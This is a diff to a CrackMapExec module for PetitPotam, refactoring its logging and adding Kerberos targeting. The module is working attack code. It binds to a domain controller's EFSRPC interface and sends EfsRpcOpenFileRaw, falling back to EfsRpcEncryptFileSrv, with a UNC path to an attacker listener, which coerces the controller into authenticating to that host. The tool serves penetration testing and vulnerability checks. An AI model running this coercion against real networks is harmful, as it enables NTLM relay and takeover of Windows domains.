@@ -4,19 +4,17 @@
 # All credit to @topotam
 # Module by @mpgn_x64
 
-import logging
 import sys
 
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
-from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
+from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD, PCHAR, RPC_SID, LPWSTR
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.uuid import uuidtup_to_bin
 
 
 class CMEModule:
-
     name = 'petitpotam'
     description = "Module to check if the DC is vulnerable to PetitPotam, credit to @topotam"
     supported_protocols = ['smb']
@@ -24,10 +22,10 @@ class CMEModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        '''
-            LISTENER            IP of your listener
-            PIPE                Default PIPE (default: lsarpc)
-        '''
+        """
+        LISTENER            IP of your listener
+        PIPE                Default PIPE (default: lsarpc)
+        """
         self.listener = "127.0.0.1"
         if 'LISTENER' in module_options:
             self.listener = module_options['LISTENER']
@@ -42,20 +40,21 @@ class CMEModule:
             domain=connection.domain,
             lmhash=connection.lmhash,
             nthash=connection.nthash,
-            target=connection.host,
+            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
             pipe=self.pipe,
             do_kerberos=connection.kerberos,
             dc_host=connection.kdcHost,
-            target_ip=connection.host
+            target_ip=connection.host,
+            context=context
         )
-        if efs_rpc_open_file_raw(dce, self.listener):
+        if efs_rpc_open_file_raw(dce, self.listener, context):
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/topotam/PetitPotam")
             try:
                 host = context.db.get_hosts(connection.host)[0]
                 context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)
             except Exception as e:
-                logging.debug(f"Error updating petitpotam status in database")
+                context.log.debug(f"Error updating petitpotam status in database")
 
 
 class DCERPCSessionError(DCERPCException):
@@ -186,7 +185,7 @@ class EfsRpcEncryptFileSrvResponse(NDRCALL):
     )
 
 
-def coerce(username, password, domain, lmhash, nthash, target, pipe, do_kerberos, dc_host, target_ip=None):
+def coerce(username, password, domain, lmhash, nthash, target, pipe, do_kerberos, dc_host, target_ip=None, context=None):
     binding_params = {
         'lsarpc': {
             'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
@@ -224,25 +223,24 @@ def coerce(username, password, domain, lmhash, nthash, target, pipe, do_kerberos
         rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)
         dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
-    logging.debug("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
+    context.log.info("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
     try:
         dce.connect()
     except Exception as e:
-        logging.debug("Something went wrong, check error status => %s" % str(e))
+        context.log.debug("Something went wrong, check error status => %s" % str(e))
         sys.exit()
-    logging.debug("[+] Connected!")
-    logging.debug("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
+    context.log.info("[+] Connected!")
+    context.log.info("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
     try:
         dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
     except Exception as e:
-        logging.debug("Something went wrong, check error status => %s" % str(e))
+        context.log.debug("Something went wrong, check error status => %s" % str(e))
         sys.exit()
-    logging.debug("[+] Successfully bound!")
+    context.log.info("[+] Successfully bound!")
     return dce
 
 
-def efs_rpc_open_file_raw(dce, listener):
-    logging.debug("[-] Sending EfsRpcOpenFileRaw!")
+def efs_rpc_open_file_raw(dce, listener, context=None):
     try:
         request = EfsRpcOpenFileRaw()
         request['fileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
@@ -251,24 +249,23 @@ def efs_rpc_open_file_raw(dce, listener):
 
     except Exception as e:
         if str(e).find('ERROR_BAD_NETPATH') >= 0:
-            logging.debug('[+] Got expected ERROR_BAD_NETPATH exception!!')
-            logging.debug('[+] Attack worked!')
+            context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')
+            context.log.info('[+] Attack worked!')
             return True
         if str(e).find('rpc_s_access_denied') >= 0:
-            logging.debug('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
-            logging.debug('[+] OK! Using unpatched function!')
-            logging.debug("[-] Sending EfsRpcEncryptFileSrv!")
+            context.log.info('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
+            context.log.info('[+] OK! Using unpatched function!')
+            context.log.info("[-] Sending EfsRpcEncryptFileSrv!")
             try:
                 request = EfsRpcEncryptFileSrv()
                 request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
                 resp = dce.request(request)
             except Exception as e:
                 if str(e).find('ERROR_BAD_NETPATH') >= 0:
-                    logging.debug('[+] Got expected ERROR_BAD_NETPATH exception!!')
-                    logging.debug('[+] Attack worked!')
+                    context.log.info('[+] Got expected ERROR_BAD_NETPATH exception!!')
+                    context.log.info('[+] Attack worked!')
                     return True
                 else:
-                    logging.debug("Something went wrong, check error status => %s" % str(e))
-
+                    context.log.debug("Something went wrong, check error status => %s" % str(e))
         else:
-            logging.debug("Something went wrong, check error status => %s" % str(e))
+            context.log.debug("Something went wrong, check error status => %s" % str(e))
